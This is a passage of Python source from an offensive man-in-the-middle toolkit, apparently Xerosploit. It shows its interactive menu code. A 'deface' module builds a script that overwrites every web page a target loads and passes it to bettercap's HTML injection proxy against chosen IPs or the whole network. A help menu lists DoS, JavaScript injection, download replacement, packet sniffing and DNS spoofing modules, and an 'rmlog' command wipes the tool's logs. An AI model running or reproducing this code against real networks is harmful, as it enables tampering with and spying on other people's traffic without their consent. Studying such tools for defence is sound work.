							print("\033[1;32m\n[+] Enter 'run' to execute the 'deface' command.\n\033[1;m")
							action_deface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_deface == "back":
								option()
							elif action_deface == "exit":
								sys.exit(exit_msg)	
							elif action_deface == "home":
								home()
							elif action_deface == "run":
								print("\033[1;32m\n[+] Specify the file containing your defacement code .\033[1;m")
								print("\033[1;33m\n[!] Your file should not contain Javascript code .\n\033[1;m")
								
								file_deface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m")
								
								if file_deface == "back":
									option()
								elif file_deface == "exit":
									sys.exit(exit_msg)	
								elif file_deface == "home":
									home()
								else:
									file_deface = file_deface.replace("'","")
									file_deface  = open(file_deface, 'r').read()
									file_deface = file_deface.replace("\n","")

									print("\033[1;34m\n[++] Overwriting all web pages ... \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

									
									content = """<script type='text/javascript'> window.onload=function(){document.body.innerHTML = " """ + file_deface + """ ";}</script>"""
									f1 = open('/home/home/xero-html.html','w')
									f1.write(content)
									f1.close()

									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()

						deface()

					elif options == "back":
						target_ip()	
					elif options == "exit":
								sys.exit(exit_msg)	
					elif options == "home":
						home()
					# Show disponible modules.
					elif options == "help":
						print ("")
						table_datas = [
		    				["\033[1;36m\n\n\n\n\n\n\n\n\n\n\n\n\n\nMODULES\n", """
pscan       :  Port Scanner

dos         :  DoS Attack

ping        :  Ping Request

injecthtml  :  Inject Html code

injectjs    :  Inject Javascript code

rdownload   :  Replace files being downloaded

sniff       :  Capturing information inside network packets

dspoof      :  Redirect all the http traffic to the specified one IP

yplay       :  Play background sound in target browser

replace     :  Replace all web pages images with your own one

driftnet    :  View all images requested by your targets

move        :  Shaking Web Browser content

deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
						]
						table = DoubleTable(table_datas)
						print(table.table)
						option()
					else:
						print("\033[1;91m\n[!] Error : Module not found . Type 'help' to view the modules list. \033[1;m")
						option()
				option()



			if target_ips == "back":
				home()
			elif target_ips == "exit":
								sys.exit(exit_msg)	
			elif target_ips == "home":
				home()
			elif target_ips == "help":
				table_datas = [
		    		["\033[1;36m\nInformation\n", "\nInsert your target IP address.\nMultiple targets : ip1,ip2,ip3,... \nThe 'all' command will target all your network.\n\n\033[1;m"]
				]
				table = DoubleTable(table_datas)
				print(table.table)
				target_ip()
		# if target = all the network
			elif target_ips == "all": 

				target_ips = ""
				target_parse = ""
				target_name = "All your network"
				program0()

			else:
				program0()







		def cmd0():
			while True:
				print("\033[1;32m\n[+] Please type 'help' to view commands.\n\033[1;m")
				cmd_0 = input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
				if cmd_0 == "scan": # Map the network
					print("\033[1;34m\n[++] Mapping your network ... \n\033[1;m")
					scan()
				elif cmd_0 == "start": # Skip network mapping and directly choose a target.
					target_ip()
				elif cmd_0 == "gateway": # Change gateway
					def gateway():
						print("")
						table_datas = [
			    			["\033[1;36m\nInformation\n", "\nManually set  your gateway.\nInsert '0' if you want to choose your default network gateway.\n\033[1;m"]
						]
						table = DoubleTable(table_datas)
						print(table.table)

						print("\033[1;32m\n[+] Enter your network gateway.\n\033[1;m")
						n_gateway = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m").strip()
			
						if n_gateway == "back":
							home()
						elif n_gateway == "exit":
								sys.exit(exit_msg)	
						elif n_gateway == "home":
							home()
						else:

							s_gateway = open('/opt/xerosploit/tools/files/gateway.txt','w')
							s_gateway.write(n_gateway)
							s_gateway.close()

							home()
					gateway()

				elif cmd_0 == "iface": # Change network interface.
					def iface():
						print ("")
						table_datas = [
			    			["\033[1;36m\nInformation\n", "\nManually set your network interface.\nInsert '0' if you want to choose your default network interface.\n\033[1;m"]
						]
						table = DoubleTable(table_datas)
						print(table.table)

						print("\033[1;32m\n[+] Enter your network interface.\n\033[1;m")
						n_up_interface = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m").strip()

						if n_up_interface == "back":
							home()
						elif n_up_interface == "exit":
								sys.exit(exit_msg)	
						elif n_up_interface == "home":
							home()
						else:
							s_up_interface = open('/opt/xerosploit/tools/files/iface.txt','w')
							s_up_interface.write(n_up_interface)
							s_up_interface.close()

							home()
					iface()		
				elif cmd_0 == "exit":
					sys.exit(exit_msg)

				elif cmd_0 == "home":
					home()

				elif cmd_0 == "rmlog": # Remove all logs
					def rm_log():
						print("\033[1;32m\n[+] Do want to remove all xerosploit logs ? (y/n)\n\033[1;m")
						cmd_rmlog = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
						if cmd_rmlog == "y":
							rmlog = os.system("rm -f -R /opt/xerosploit/xerosniff/ /opt/xerosploit/tools/log/* /opt/xerosploit/tools/bettercap/modules/tmp/* /opt/xerosploit/tools/files/dns.conf")
							print("\033[1;31m\n[++] All logs have been removed. \n\033[1;m")
							sleep(1)
							home()
						elif cmd_rmlog == "n":
							home()
						
						elif cmd_rmlog == "exit":
							sys.exit(exit_msg)

						elif cmd_rmlog == "home":
							home()
						elif cmd_rmlog == "back":
							home()
						else:
							print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
							rm_log()
					rm_log()	
# Principal commands
				elif cmd_0 == "help":
					print ("")
					table_datas = [
			    		["\033[1;36m\n\n\n\nCOMMANDS\n", """
scan     :  Map your network.

iface    :  Manually set your network interface.

gateway  :  Manually set your gateway.

start    :  Skip scan and directly set your target IP address.

rmlog    :  Delete all xerosploit logs.

help     :  Display this help message.

exit     :  Close Xerosploit.\n\033[1;m"""]
					]
					table = DoubleTable(table_datas)
					print(table.table)


				else:
					print("\033[1;91m\n[!] Error : Command not found.\033[1;m")


		home()			
		cmd0()


	except KeyboardInterrupt:
		print ("\n" + exit_msg)
		sleep(1)
	except Exception:
		traceback.print_exc(file=sys.stdout)
	sys.exit(0)

if __name__ == "__main__":
	main()
